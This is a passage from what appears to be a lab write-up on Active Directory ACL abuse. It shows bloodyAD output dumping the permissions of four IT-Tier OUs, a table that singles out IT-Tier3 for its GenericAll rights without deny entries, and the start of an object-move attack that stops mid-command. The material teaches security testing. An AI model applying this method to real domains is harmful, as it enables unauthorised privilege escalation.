⠀⠀⠀⠀⠀⠈⢯⡈⣏⣯⣆⢹⣼⣧⠀⡄⠀⢻⣆⠀⢀⢻⣄⣸⣹⣇⣸⣦⣿⡆⢿⣷⣾⡟⣸⠛⣿⣻⣿⣿⣿⣾⠻⣇
⠀⠀⠀⠀⠀⠀⠈⢿⣏⢉⣽⣉⠹⣌⣿⣻⣶⣾⣟⣻⣿⣿⣿⡿⣽⠀⣣⠹⡌⣿⣲⣬⡥⣾⣿⣿⣿⣿⣿⣿⣿⣿⡷⣿
⠀⠀⠀⠀⠀⠀⠀⠈⢿⡚⠛⢿⠓⠿⣏⢻⣿⣿⣿⣿⣿⣿⣿⣿⡞⠳⡗⣶⢿⡉⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⢻⡞⠁
⠀⠀⠀⠀⠀⠀⠀⠀⠈⠳⠾⠦⠷⠤⠼⠿⠯⠭⠿⠿⠿⠿⠽⠿⠿⠶⠤⠧⠤⠿⠧⠤⠼⠧⠤⠼⠤⠼⠧⠤⠿⠋⠀⠀

```

---

## 10. OU ACL Analysis & Object Move Attack

Dumping ACLs on the four IT-Tier OUs:

```

(myvenv) ┌─[donmed@parrot]─[~/LAB/Hacksmarter/Defense]─[10.200.96.99]
└──╼ $ for tier in 1 2 3 4; do
  echo "=== IT-Tier$tier ==="
  bloodyAD --host DC.hsm-defense.local -d hsm-defense.local -k \
    get object "OU=IT-Tier$tier,DC=hsm-defense,DC=local" --attr nTSecurityDescriptor --resolve-sd
done
=== IT-Tier1 ===

distinguishedName: OU=IT-Tier1,DC=hsm-defense,DC=local
nTSecurityDescriptor.Owner: Domain Admins
nTSecurityDescriptor.Control: DACL_AUTO_INHERITED|DACL_PRESENT|SACL_AUTO_INHERITED|SELF_RELATIVE
nTSecurityDescriptor.ACL.0.Type: == DENIED ==
nTSecurityDescriptor.ACL.0.Trustee: EVERYONE
nTSecurityDescriptor.ACL.0.Right: DELETE|DELETE_TREE
nTSecurityDescriptor.ACL.0.ObjectType: Self
nTSecurityDescriptor.ACL.1.Type: == ALLOWED_OBJECT ==
nTSecurityDescriptor.ACL.1.Trustee: ACCOUNT_OPERATORS
nTSecurityDescriptor.ACL.1.Right: DELETE_CHILD|CREATE_CHILD
nTSecurityDescriptor.ACL.1.ObjectType: Computer; Group; User; inetOrgPerson
nTSecurityDescriptor.ACL.2.Type: == ALLOWED_OBJECT ==
nTSecurityDescriptor.ACL.2.Trustee: PRINTER_OPERATORS
nTSecurityDescriptor.ACL.2.Right: DELETE_CHILD|CREATE_CHILD
nTSecurityDescriptor.ACL.2.ObjectType: Print-Queue
nTSecurityDescriptor.ACL.3.Type: == ALLOWED ==
nTSecurityDescriptor.ACL.3.Trustee: caleb.turner
nTSecurityDescriptor.ACL.3.Right: DELETE_CHILD
nTSecurityDescriptor.ACL.3.ObjectType: Self
nTSecurityDescriptor.ACL.4.Type: == ALLOWED ==
nTSecurityDescriptor.ACL.4.Trustee: LOCAL_SYSTEM; Domain Admins
nTSecurityDescriptor.ACL.4.Right: GENERIC_ALL
nTSecurityDescriptor.ACL.4.ObjectType: Self
nTSecurityDescriptor.ACL.5.Type: == ALLOWED ==
nTSecurityDescriptor.ACL.5.Trustee: ENTERPRISE_DOMAIN_CONTROLLERS; AUTHENTICATED_USERS
nTSecurityDescriptor.ACL.5.Right: GENERIC_READ
nTSecurityDescriptor.ACL.5.ObjectType: Self
nTSecurityDescriptor.ACL.6.Type: == ALLOWED_OBJECT ==
nTSecurityDescriptor.ACL.6.Trustee: ALIAS_PREW2KCOMPACC
nTSecurityDescriptor.ACL.6.Right: READ_PROP
nTSecurityDescriptor.ACL.6.ObjectType: Group-Membership (property set); General-Information (property set); Account-Restrictions (property set); Remote-Access-Information (property set); Logon-Information (property set)
nTSecurityDescriptor.ACL.6.InheritedObjectType: User; inetOrgPerson
nTSecurityDescriptor.ACL.6.Flags: CONTAINER_INHERIT; INHERIT_ONLY; INHERITED
nTSecurityDescriptor.ACL.7.Type: == ALLOWED_OBJECT ==
nTSecurityDescriptor.ACL.7.Trustee: Enterprise Key Admins; Key Admins
nTSecurityDescriptor.ACL.7.Right: WRITE_PROP|READ_PROP
nTSecurityDescriptor.ACL.7.ObjectType: ms-DS-Key-Credential-Link
nTSecurityDescriptor.ACL.7.Flags: CONTAINER_INHERIT; INHERITED
nTSecurityDescriptor.ACL.8.Type: == ALLOWED_OBJECT ==
nTSecurityDescriptor.ACL.8.Trustee: PRINCIPAL_SELF; CREATOR_OWNER
nTSecurityDescriptor.ACL.8.Right: WRITE_VALIDATED
nTSecurityDescriptor.ACL.8.ObjectType: DS-Validated-Write-Computer
nTSecurityDescriptor.ACL.8.InheritedObjectType: Computer
nTSecurityDescriptor.ACL.8.Flags: CONTAINER_INHERIT; INHERIT_ONLY; INHERITED
nTSecurityDescriptor.ACL.9.Type: == ALLOWED_OBJECT ==
nTSecurityDescriptor.ACL.9.Trustee: ENTERPRISE_DOMAIN_CONTROLLERS
nTSecurityDescriptor.ACL.9.Right: READ_PROP
nTSecurityDescriptor.ACL.9.ObjectType: Token-Groups
nTSecurityDescriptor.ACL.9.InheritedObjectType: Computer; User; Group
nTSecurityDescriptor.ACL.9.Flags: CONTAINER_INHERIT; INHERIT_ONLY; INHERITED
nTSecurityDescriptor.ACL.10.Type: == ALLOWED_OBJECT ==
nTSecurityDescriptor.ACL.10.Trustee: PRINCIPAL_SELF
nTSecurityDescriptor.ACL.10.Right: WRITE_PROP
nTSecurityDescriptor.ACL.10.ObjectType: ms-TPM-Tpm-Information-For-Computer
nTSecurityDescriptor.ACL.10.InheritedObjectType: Computer
nTSecurityDescriptor.ACL.10.Flags: CONTAINER_INHERIT; INHERIT_ONLY; INHERITED
nTSecurityDescriptor.ACL.11.Type: == ALLOWED_OBJECT ==
nTSecurityDescriptor.ACL.11.Trustee: ALIAS_PREW2KCOMPACC
nTSecurityDescriptor.ACL.11.Right: GENERIC_READ
nTSecurityDescriptor.ACL.11.ObjectType: Self
nTSecurityDescriptor.ACL.11.InheritedObjectType: Group; User; inetOrgPerson
nTSecurityDescriptor.ACL.11.Flags: CONTAINER_INHERIT; INHERIT_ONLY; INHERITED
nTSecurityDescriptor.ACL.12.Type: == ALLOWED_OBJECT ==
nTSecurityDescriptor.ACL.12.Trustee: PRINCIPAL_SELF
nTSecurityDescriptor.ACL.12.Right: WRITE_PROP|READ_PROP
nTSecurityDescriptor.ACL.12.ObjectType: ms-DS-Allowed-To-Act-On-Behalf-Of-Other-Identity
nTSecurityDescriptor.ACL.12.Flags: CONTAINER_INHERIT; INHERITED; OBJECT_INHERIT
nTSecurityDescriptor.ACL.13.Type: == ALLOWED_OBJECT ==
nTSecurityDescriptor.ACL.13.Trustee: PRINCIPAL_SELF
nTSecurityDescriptor.ACL.13.Right: CONTROL_ACCESS|WRITE_PROP|READ_PROP
nTSecurityDescriptor.ACL.13.ObjectType: Private-Information (property set)
nTSecurityDescriptor.ACL.13.Flags: CONTAINER_INHERIT; INHERITED
nTSecurityDescriptor.ACL.14.Type: == ALLOWED ==
nTSecurityDescriptor.ACL.14.Trustee: Enterprise Admins
nTSecurityDescriptor.ACL.14.Right: GENERIC_ALL
nTSecurityDescriptor.ACL.14.ObjectType: Self
nTSecurityDescriptor.ACL.14.Flags: CONTAINER_INHERIT; INHERITED
nTSecurityDescriptor.ACL.15.Type: == ALLOWED ==
nTSecurityDescriptor.ACL.15.Trustee: ALIAS_PREW2KCOMPACC
nTSecurityDescriptor.ACL.15.Right: LIST_CHILD
nTSecurityDescriptor.ACL.15.ObjectType: Self
nTSecurityDescriptor.ACL.15.Flags: CONTAINER_INHERIT; INHERITED
nTSecurityDescriptor.ACL.16.Type: == ALLOWED ==
nTSecurityDescriptor.ACL.16.Trustee: BUILTIN_ADMINISTRATORS
nTSecurityDescriptor.ACL.16.Right: WRITE_OWNER|WRITE_DACL|GENERIC_READ|DELETE|CONTROL_ACCESS|WRITE_PROP|WRITE_VALIDATED|CREATE_CHILD
nTSecurityDescriptor.ACL.16.ObjectType: Self
nTSecurityDescriptor.ACL.16.Flags: CONTAINER_INHERIT; INHERITED
=== IT-Tier2 ===

distinguishedName: OU=IT-Tier2,DC=hsm-defense,DC=local
nTSecurityDescriptor.Owner: Domain Admins
nTSecurityDescriptor.Control: DACL_AUTO_INHERITED|DACL_PRESENT|SACL_AUTO_INHERITED|SELF_RELATIVE
nTSecurityDescriptor.ACL.0.Type: == DENIED_OBJECT ==
nTSecurityDescriptor.ACL.0.Trustee: IT OU Operators
nTSecurityDescriptor.ACL.0.Right: CREATE_CHILD
nTSecurityDescriptor.ACL.0.ObjectType: User
nTSecurityDescriptor.ACL.1.Type: == DENIED ==
nTSecurityDescriptor.ACL.1.Trustee: IT OU Operators
nTSecurityDescriptor.ACL.1.Right: WRITE_PROP
nTSecurityDescriptor.ACL.1.ObjectType: Self
nTSecurityDescriptor.ACL.2.Type: == DENIED ==
nTSecurityDescriptor.ACL.2.Trustee: EVERYONE
nTSecurityDescriptor.ACL.2.Right: DELETE|DELETE_TREE
nTSecurityDescriptor.ACL.2.ObjectType: Self
nTSecurityDescriptor.ACL.3.Type: == ALLOWED_OBJECT ==
nTSecurityDescriptor.ACL.3.Trustee: ACCOUNT_OPERATORS
nTSecurityDescriptor.ACL.3.Right: DELETE_CHILD|CREATE_CHILD
nTSecurityDescriptor.ACL.3.ObjectType: inetOrgPerson; Group; Computer; User
nTSecurityDescriptor.ACL.4.Type: == ALLOWED_OBJECT ==
nTSecurityDescriptor.ACL.4.Trustee: PRINTER_OPERATORS
nTSecurityDescriptor.ACL.4.Right: DELETE_CHILD|CREATE_CHILD
nTSecurityDescriptor.ACL.4.ObjectType: Print-Queue
nTSecurityDescriptor.ACL.5.Type: == ALLOWED ==
nTSecurityDescriptor.ACL.5.Trustee: LOCAL_SYSTEM; Domain Admins
nTSecurityDescriptor.ACL.5.Right: GENERIC_ALL
nTSecurityDescriptor.ACL.5.ObjectType: Self
nTSecurityDescriptor.ACL.6.Type: == ALLOWED ==
nTSecurityDescriptor.ACL.6.Trustee: IT OU Operators
nTSecurityDescriptor.ACL.6.Right: GENERIC_ALL
nTSecurityDescriptor.ACL.6.ObjectType: Self
nTSecurityDescriptor.ACL.6.Flags: CONTAINER_INHERIT
nTSecurityDescriptor.ACL.7.Type: == ALLOWED ==
nTSecurityDescriptor.ACL.7.Trustee: ENTERPRISE_DOMAIN_CONTROLLERS; AUTHENTICATED_USERS
nTSecurityDescriptor.ACL.7.Right: GENERIC_READ
nTSecurityDescriptor.ACL.7.ObjectType: Self
nTSecurityDescriptor.ACL.8.Type: == ALLOWED_OBJECT ==
nTSecurityDescriptor.ACL.8.Trustee: ALIAS_PREW2KCOMPACC
nTSecurityDescriptor.ACL.8.Right: READ_PROP
nTSecurityDescriptor.ACL.8.ObjectType: Logon-Information (property set); General-Information (property set); Remote-Access-Information (property set); Group-Membership (property set); Account-Restrictions (property set)
nTSecurityDescriptor.ACL.8.InheritedObjectType: inetOrgPerson; User
nTSecurityDescriptor.ACL.8.Flags: CONTAINER_INHERIT; INHERIT_ONLY; INHERITED
nTSecurityDescriptor.ACL.9.Type: == ALLOWED_OBJECT ==
nTSecurityDescriptor.ACL.9.Trustee: Enterprise Key Admins; Key Admins
nTSecurityDescriptor.ACL.9.Right: WRITE_PROP|READ_PROP
nTSecurityDescriptor.ACL.9.ObjectType: ms-DS-Key-Credential-Link
nTSecurityDescriptor.ACL.9.Flags: CONTAINER_INHERIT; INHERITED
nTSecurityDescriptor.ACL.10.Type: == ALLOWED_OBJECT ==
nTSecurityDescriptor.ACL.10.Trustee: CREATOR_OWNER; PRINCIPAL_SELF
nTSecurityDescriptor.ACL.10.Right: WRITE_VALIDATED
nTSecurityDescriptor.ACL.10.ObjectType: DS-Validated-Write-Computer
nTSecurityDescriptor.ACL.10.InheritedObjectType: Computer
nTSecurityDescriptor.ACL.10.Flags: CONTAINER_INHERIT; INHERIT_ONLY; INHERITED
nTSecurityDescriptor.ACL.11.Type: == ALLOWED_OBJECT ==
nTSecurityDescriptor.ACL.11.Trustee: ENTERPRISE_DOMAIN_CONTROLLERS
nTSecurityDescriptor.ACL.11.Right: READ_PROP
nTSecurityDescriptor.ACL.11.ObjectType: Token-Groups
nTSecurityDescriptor.ACL.11.InheritedObjectType: Group; Computer; User
nTSecurityDescriptor.ACL.11.Flags: CONTAINER_INHERIT; INHERIT_ONLY; INHERITED
nTSecurityDescriptor.ACL.12.Type: == ALLOWED_OBJECT ==
nTSecurityDescriptor.ACL.12.Trustee: PRINCIPAL_SELF
nTSecurityDescriptor.ACL.12.Right: WRITE_PROP
nTSecurityDescriptor.ACL.12.ObjectType: ms-TPM-Tpm-Information-For-Computer
nTSecurityDescriptor.ACL.12.InheritedObjectType: Computer
nTSecurityDescriptor.ACL.12.Flags: CONTAINER_INHERIT; INHERIT_ONLY; INHERITED
nTSecurityDescriptor.ACL.13.Type: == ALLOWED_OBJECT ==
nTSecurityDescriptor.ACL.13.Trustee: ALIAS_PREW2KCOMPACC
nTSecurityDescriptor.ACL.13.Right: GENERIC_READ
nTSecurityDescriptor.ACL.13.ObjectType: Self
nTSecurityDescriptor.ACL.13.InheritedObjectType: inetOrgPerson; Group; User
nTSecurityDescriptor.ACL.13.Flags: CONTAINER_INHERIT; INHERIT_ONLY; INHERITED
nTSecurityDescriptor.ACL.14.Type: == ALLOWED_OBJECT ==
nTSecurityDescriptor.ACL.14.Trustee: PRINCIPAL_SELF
nTSecurityDescriptor.ACL.14.Right: WRITE_PROP|READ_PROP
nTSecurityDescriptor.ACL.14.ObjectType: ms-DS-Allowed-To-Act-On-Behalf-Of-Other-Identity
nTSecurityDescriptor.ACL.14.Flags: CONTAINER_INHERIT; INHERITED; OBJECT_INHERIT
nTSecurityDescriptor.ACL.15.Type: == ALLOWED_OBJECT ==
nTSecurityDescriptor.ACL.15.Trustee: PRINCIPAL_SELF
nTSecurityDescriptor.ACL.15.Right: CONTROL_ACCESS|WRITE_PROP|READ_PROP
nTSecurityDescriptor.ACL.15.ObjectType: Private-Information (property set)
nTSecurityDescriptor.ACL.15.Flags: CONTAINER_INHERIT; INHERITED
nTSecurityDescriptor.ACL.16.Type: == ALLOWED ==
nTSecurityDescriptor.ACL.16.Trustee: Enterprise Admins
nTSecurityDescriptor.ACL.16.Right: GENERIC_ALL
nTSecurityDescriptor.ACL.16.ObjectType: Self
nTSecurityDescriptor.ACL.16.Flags: CONTAINER_INHERIT; INHERITED
nTSecurityDescriptor.ACL.17.Type: == ALLOWED ==
nTSecurityDescriptor.ACL.17.Trustee: ALIAS_PREW2KCOMPACC
nTSecurityDescriptor.ACL.17.Right: LIST_CHILD
nTSecurityDescriptor.ACL.17.ObjectType: Self
nTSecurityDescriptor.ACL.17.Flags: CONTAINER_INHERIT; INHERITED
nTSecurityDescriptor.ACL.18.Type: == ALLOWED ==
nTSecurityDescriptor.ACL.18.Trustee: BUILTIN_ADMINISTRATORS
nTSecurityDescriptor.ACL.18.Right: WRITE_OWNER|WRITE_DACL|GENERIC_READ|DELETE|CONTROL_ACCESS|WRITE_PROP|WRITE_VALIDATED|CREATE_CHILD
nTSecurityDescriptor.ACL.18.ObjectType: Self
nTSecurityDescriptor.ACL.18.Flags: CONTAINER_INHERIT; INHERITED
=== IT-Tier3 ===

distinguishedName: OU=IT-Tier3,DC=hsm-defense,DC=local
nTSecurityDescriptor.Owner: Domain Admins
nTSecurityDescriptor.Control: DACL_AUTO_INHERITED|DACL_PRESENT|SACL_AUTO_INHERITED|SELF_RELATIVE
nTSecurityDescriptor.ACL.0.Type: == DENIED ==
nTSecurityDescriptor.ACL.0.Trustee: EVERYONE
nTSecurityDescriptor.ACL.0.Right: DELETE|DELETE_TREE
nTSecurityDescriptor.ACL.0.ObjectType: Self
nTSecurityDescriptor.ACL.1.Type: == ALLOWED_OBJECT ==
nTSecurityDescriptor.ACL.1.Trustee: ACCOUNT_OPERATORS
nTSecurityDescriptor.ACL.1.Right: DELETE_CHILD|CREATE_CHILD
nTSecurityDescriptor.ACL.1.ObjectType: inetOrgPerson; Group; User; Computer
nTSecurityDescriptor.ACL.2.Type: == ALLOWED_OBJECT ==
nTSecurityDescriptor.ACL.2.Trustee: PRINTER_OPERATORS
nTSecurityDescriptor.ACL.2.Right: DELETE_CHILD|CREATE_CHILD
nTSecurityDescriptor.ACL.2.ObjectType: Print-Queue
nTSecurityDescriptor.ACL.3.Type: == ALLOWED ==
nTSecurityDescriptor.ACL.3.Trustee: LOCAL_SYSTEM; Domain Admins
nTSecurityDescriptor.ACL.3.Right: GENERIC_ALL
nTSecurityDescriptor.ACL.3.ObjectType: Self
nTSecurityDescriptor.ACL.4.Type: == ALLOWED ==
nTSecurityDescriptor.ACL.4.Trustee: IT OU Operators
nTSecurityDescriptor.ACL.4.Right: GENERIC_ALL
nTSecurityDescriptor.ACL.4.ObjectType: Self
nTSecurityDescriptor.ACL.4.Flags: CONTAINER_INHERIT
nTSecurityDescriptor.ACL.5.Type: == ALLOWED ==
nTSecurityDescriptor.ACL.5.Trustee: AUTHENTICATED_USERS; ENTERPRISE_DOMAIN_CONTROLLERS
nTSecurityDescriptor.ACL.5.Right: GENERIC_READ
nTSecurityDescriptor.ACL.5.ObjectType: Self
nTSecurityDescriptor.ACL.6.Type: == ALLOWED_OBJECT ==
nTSecurityDescriptor.ACL.6.Trustee: ALIAS_PREW2KCOMPACC
nTSecurityDescriptor.ACL.6.Right: READ_PROP
nTSecurityDescriptor.ACL.6.ObjectType: Logon-Information (property set); Group-Membership (property set); General-Information (property set); Remote-Access-Information (property set); Account-Restrictions (property set)
nTSecurityDescriptor.ACL.6.InheritedObjectType: inetOrgPerson; User
nTSecurityDescriptor.ACL.6.Flags: CONTAINER_INHERIT; INHERIT_ONLY; INHERITED
nTSecurityDescriptor.ACL.7.Type: == ALLOWED_OBJECT ==
nTSecurityDescriptor.ACL.7.Trustee: Key Admins; Enterprise Key Admins
nTSecurityDescriptor.ACL.7.Right: WRITE_PROP|READ_PROP
nTSecurityDescriptor.ACL.7.ObjectType: ms-DS-Key-Credential-Link
nTSecurityDescriptor.ACL.7.Flags: CONTAINER_INHERIT; INHERITED
nTSecurityDescriptor.ACL.8.Type: == ALLOWED_OBJECT ==
nTSecurityDescriptor.ACL.8.Trustee: PRINCIPAL_SELF; CREATOR_OWNER
nTSecurityDescriptor.ACL.8.Right: WRITE_VALIDATED
nTSecurityDescriptor.ACL.8.ObjectType: DS-Validated-Write-Computer
nTSecurityDescriptor.ACL.8.InheritedObjectType: Computer
nTSecurityDescriptor.ACL.8.Flags: CONTAINER_INHERIT; INHERIT_ONLY; INHERITED
nTSecurityDescriptor.ACL.9.Type: == ALLOWED_OBJECT ==
nTSecurityDescriptor.ACL.9.Trustee: ENTERPRISE_DOMAIN_CONTROLLERS
nTSecurityDescriptor.ACL.9.Right: READ_PROP
nTSecurityDescriptor.ACL.9.ObjectType: Token-Groups
nTSecurityDescriptor.ACL.9.InheritedObjectType: Group; User; Computer
nTSecurityDescriptor.ACL.9.Flags: CONTAINER_INHERIT; INHERIT_ONLY; INHERITED
nTSecurityDescriptor.ACL.10.Type: == ALLOWED_OBJECT ==
nTSecurityDescriptor.ACL.10.Trustee: PRINCIPAL_SELF
nTSecurityDescriptor.ACL.10.Right: WRITE_PROP
nTSecurityDescriptor.ACL.10.ObjectType: ms-TPM-Tpm-Information-For-Computer
nTSecurityDescriptor.ACL.10.InheritedObjectType: Computer
nTSecurityDescriptor.ACL.10.Flags: CONTAINER_INHERIT; INHERIT_ONLY; INHERITED
nTSecurityDescriptor.ACL.11.Type: == ALLOWED_OBJECT ==
nTSecurityDescriptor.ACL.11.Trustee: ALIAS_PREW2KCOMPACC
nTSecurityDescriptor.ACL.11.Right: GENERIC_READ
nTSecurityDescriptor.ACL.11.ObjectType: Self
nTSecurityDescriptor.ACL.11.InheritedObjectType: inetOrgPerson; Group; User
nTSecurityDescriptor.ACL.11.Flags: CONTAINER_INHERIT; INHERIT_ONLY; INHERITED
nTSecurityDescriptor.ACL.12.Type: == ALLOWED_OBJECT ==
nTSecurityDescriptor.ACL.12.Trustee: PRINCIPAL_SELF
nTSecurityDescriptor.ACL.12.Right: WRITE_PROP|READ_PROP
nTSecurityDescriptor.ACL.12.ObjectType: ms-DS-Allowed-To-Act-On-Behalf-Of-Other-Identity
nTSecurityDescriptor.ACL.12.Flags: CONTAINER_INHERIT; INHERITED; OBJECT_INHERIT
nTSecurityDescriptor.ACL.13.Type: == ALLOWED_OBJECT ==
nTSecurityDescriptor.ACL.13.Trustee: PRINCIPAL_SELF
nTSecurityDescriptor.ACL.13.Right: CONTROL_ACCESS|WRITE_PROP|READ_PROP
nTSecurityDescriptor.ACL.13.ObjectType: Private-Information (property set)
nTSecurityDescriptor.ACL.13.Flags: CONTAINER_INHERIT; INHERITED
nTSecurityDescriptor.ACL.14.Type: == ALLOWED ==
nTSecurityDescriptor.ACL.14.Trustee: Enterprise Admins
nTSecurityDescriptor.ACL.14.Right: GENERIC_ALL
nTSecurityDescriptor.ACL.14.ObjectType: Self
nTSecurityDescriptor.ACL.14.Flags: CONTAINER_INHERIT; INHERITED
nTSecurityDescriptor.ACL.15.Type: == ALLOWED ==
nTSecurityDescriptor.ACL.15.Trustee: ALIAS_PREW2KCOMPACC
nTSecurityDescriptor.ACL.15.Right: LIST_CHILD
nTSecurityDescriptor.ACL.15.ObjectType: Self
nTSecurityDescriptor.ACL.15.Flags: CONTAINER_INHERIT; INHERITED
nTSecurityDescriptor.ACL.16.Type: == ALLOWED ==
nTSecurityDescriptor.ACL.16.Trustee: BUILTIN_ADMINISTRATORS
nTSecurityDescriptor.ACL.16.Right: WRITE_OWNER|WRITE_DACL|GENERIC_READ|DELETE|CONTROL_ACCESS|WRITE_PROP|WRITE_VALIDATED|CREATE_CHILD
nTSecurityDescriptor.ACL.16.ObjectType: Self
nTSecurityDescriptor.ACL.16.Flags: CONTAINER_INHERIT; INHERITED
=== IT-Tier4 ===

distinguishedName: OU=IT-Tier4,DC=hsm-defense,DC=local
nTSecurityDescriptor.Owner: Domain Admins
nTSecurityDescriptor.Control: DACL_AUTO_INHERITED|DACL_PRESENT|SACL_AUTO_INHERITED|SELF_RELATIVE
nTSecurityDescriptor.ACL.0.Type: == DENIED_OBJECT ==
nTSecurityDescriptor.ACL.0.Trustee: IT OU Operators
nTSecurityDescriptor.ACL.0.Right: CREATE_CHILD
nTSecurityDescriptor.ACL.0.ObjectType: User
nTSecurityDescriptor.ACL.1.Type: == DENIED ==
nTSecurityDescriptor.ACL.1.Trustee: EVERYONE
nTSecurityDescriptor.ACL.1.Right: DELETE|DELETE_TREE
nTSecurityDescriptor.ACL.1.ObjectType: Self
nTSecurityDescriptor.ACL.2.Type: == ALLOWED_OBJECT ==
nTSecurityDescriptor.ACL.2.Trustee: ACCOUNT_OPERATORS
nTSecurityDescriptor.ACL.2.Right: DELETE_CHILD|CREATE_CHILD
nTSecurityDescriptor.ACL.2.ObjectType: User; Group; Computer; inetOrgPerson
nTSecurityDescriptor.ACL.3.Type: == ALLOWED_OBJECT ==
nTSecurityDescriptor.ACL.3.Trustee: PRINTER_OPERATORS
nTSecurityDescriptor.ACL.3.Right: DELETE_CHILD|CREATE_CHILD
nTSecurityDescriptor.ACL.3.ObjectType: Print-Queue
nTSecurityDescriptor.ACL.4.Type: == ALLOWED ==
nTSecurityDescriptor.ACL.4.Trustee: Domain Admins; LOCAL_SYSTEM
nTSecurityDescriptor.ACL.4.Right: GENERIC_ALL
nTSecurityDescriptor.ACL.4.ObjectType: Self
nTSecurityDescriptor.ACL.5.Type: == ALLOWED ==
nTSecurityDescriptor.ACL.5.Trustee: IT OU Operators
nTSecurityDescriptor.ACL.5.Right: GENERIC_ALL
nTSecurityDescriptor.ACL.5.ObjectType: Self
nTSecurityDescriptor.ACL.5.Flags: CONTAINER_INHERIT
nTSecurityDescriptor.ACL.6.Type: == ALLOWED ==
nTSecurityDescriptor.ACL.6.Trustee: ENTERPRISE_DOMAIN_CONTROLLERS; AUTHENTICATED_USERS
nTSecurityDescriptor.ACL.6.Right: GENERIC_READ
nTSecurityDescriptor.ACL.6.ObjectType: Self
nTSecurityDescriptor.ACL.7.Type: == ALLOWED_OBJECT ==
nTSecurityDescriptor.ACL.7.Trustee: ALIAS_PREW2KCOMPACC
nTSecurityDescriptor.ACL.7.Right: READ_PROP
nTSecurityDescriptor.ACL.7.ObjectType: Group-Membership (property set); Logon-Information (property set); Account-Restrictions (property set); Remote-Access-Information (property set); General-Information (property set)
nTSecurityDescriptor.ACL.7.InheritedObjectType: User; inetOrgPerson
nTSecurityDescriptor.ACL.7.Flags: CONTAINER_INHERIT; INHERIT_ONLY; INHERITED
nTSecurityDescriptor.ACL.8.Type: == ALLOWED_OBJECT ==
nTSecurityDescriptor.ACL.8.Trustee: Enterprise Key Admins; Key Admins
nTSecurityDescriptor.ACL.8.Right: WRITE_PROP|READ_PROP
nTSecurityDescriptor.ACL.8.ObjectType: ms-DS-Key-Credential-Link
nTSecurityDescriptor.ACL.8.Flags: CONTAINER_INHERIT; INHERITED
nTSecurityDescriptor.ACL.9.Type: == ALLOWED_OBJECT ==
nTSecurityDescriptor.ACL.9.Trustee: CREATOR_OWNER; PRINCIPAL_SELF
nTSecurityDescriptor.ACL.9.Right: WRITE_VALIDATED
nTSecurityDescriptor.ACL.9.ObjectType: DS-Validated-Write-Computer
nTSecurityDescriptor.ACL.9.InheritedObjectType: Computer
nTSecurityDescriptor.ACL.9.Flags: CONTAINER_INHERIT; INHERIT_ONLY; INHERITED
nTSecurityDescriptor.ACL.10.Type: == ALLOWED_OBJECT ==
nTSecurityDescriptor.ACL.10.Trustee: ENTERPRISE_DOMAIN_CONTROLLERS
nTSecurityDescriptor.ACL.10.Right: READ_PROP
nTSecurityDescriptor.ACL.10.ObjectType: Token-Groups
nTSecurityDescriptor.ACL.10.InheritedObjectType: User; Group; Computer
nTSecurityDescriptor.ACL.10.Flags: CONTAINER_INHERIT; INHERIT_ONLY; INHERITED
nTSecurityDescriptor.ACL.11.Type: == ALLOWED_OBJECT ==
nTSecurityDescriptor.ACL.11.Trustee: PRINCIPAL_SELF
nTSecurityDescriptor.ACL.11.Right: WRITE_PROP
nTSecurityDescriptor.ACL.11.ObjectType: ms-TPM-Tpm-Information-For-Computer
nTSecurityDescriptor.ACL.11.InheritedObjectType: Computer
nTSecurityDescriptor.ACL.11.Flags: CONTAINER_INHERIT; INHERIT_ONLY; INHERITED
nTSecurityDescriptor.ACL.12.Type: == ALLOWED_OBJECT ==
nTSecurityDescriptor.ACL.12.Trustee: ALIAS_PREW2KCOMPACC
nTSecurityDescriptor.ACL.12.Right: GENERIC_READ
nTSecurityDescriptor.ACL.12.ObjectType: Self
nTSecurityDescriptor.ACL.12.InheritedObjectType: User; Group; inetOrgPerson
nTSecurityDescriptor.ACL.12.Flags: CONTAINER_INHERIT; INHERIT_ONLY; INHERITED
nTSecurityDescriptor.ACL.13.Type: == ALLOWED_OBJECT ==
nTSecurityDescriptor.ACL.13.Trustee: PRINCIPAL_SELF
nTSecurityDescriptor.ACL.13.Right: WRITE_PROP|READ_PROP
nTSecurityDescriptor.ACL.13.ObjectType: ms-DS-Allowed-To-Act-On-Behalf-Of-Other-Identity
nTSecurityDescriptor.ACL.13.Flags: CONTAINER_INHERIT; INHERITED; OBJECT_INHERIT
nTSecurityDescriptor.ACL.14.Type: == ALLOWED_OBJECT ==
nTSecurityDescriptor.ACL.14.Trustee: PRINCIPAL_SELF
nTSecurityDescriptor.ACL.14.Right: CONTROL_ACCESS|WRITE_PROP|READ_PROP
nTSecurityDescriptor.ACL.14.ObjectType: Private-Information (property set)
nTSecurityDescriptor.ACL.14.Flags: CONTAINER_INHERIT; INHERITED
nTSecurityDescriptor.ACL.15.Type: == ALLOWED ==
nTSecurityDescriptor.ACL.15.Trustee: Enterprise Admins
nTSecurityDescriptor.ACL.15.Right: GENERIC_ALL
nTSecurityDescriptor.ACL.15.ObjectType: Self
nTSecurityDescriptor.ACL.15.Flags: CONTAINER_INHERIT; INHERITED
nTSecurityDescriptor.ACL.16.Type: == ALLOWED ==
nTSecurityDescriptor.ACL.16.Trustee: ALIAS_PREW2KCOMPACC
nTSecurityDescriptor.ACL.16.Right: LIST_CHILD
nTSecurityDescriptor.ACL.16.ObjectType: Self
nTSecurityDescriptor.ACL.16.Flags: CONTAINER_INHERIT; INHERITED
nTSecurityDescriptor.ACL.17.Type: == ALLOWED ==
nTSecurityDescriptor.ACL.17.Trustee: BUILTIN_ADMINISTRATORS
nTSecurityDescriptor.ACL.17.Right: WRITE_OWNER|WRITE_DACL|GENERIC_READ|DELETE|CONTROL_ACCESS|WRITE_PROP|WRITE_VALIDATED|CREATE_CHILD
nTSecurityDescriptor.ACL.17.ObjectType: Self
nTSecurityDescriptor.ACL.17.Flags: CONTAINER_INHERIT; INHERITED


```

**Findings:**

| OU | caleb.turner / IT OU Operators rights | Deny ACEs |
|---|---|---|
| IT-Tier1 | caleb.turner has `DELETE_CHILD` only | None |
| IT-Tier2 | `GenericAll` with CONTAINER_INHERIT | `CREATE_CHILD` (User) + `WRITE_PROP` |
| **IT-Tier3** | **`GenericAll` with CONTAINER_INHERIT** | **None** |
| IT-Tier4 | `GenericAll` with CONTAINER_INHERIT | `CREATE_CHILD` (User) |

**IT-Tier3 is the target** — full control with no Deny ACEs.

### Move oscar.mazerath from IT-Tier1 to IT-Tier3

Moving an AD object requires **DELETE_CHILD** on the source OU and **CREATE_CHILD** on the destination OU. We have both:

```
bloodyAD --host DC.hsm-defense.local -d hsm-defense.local -k \
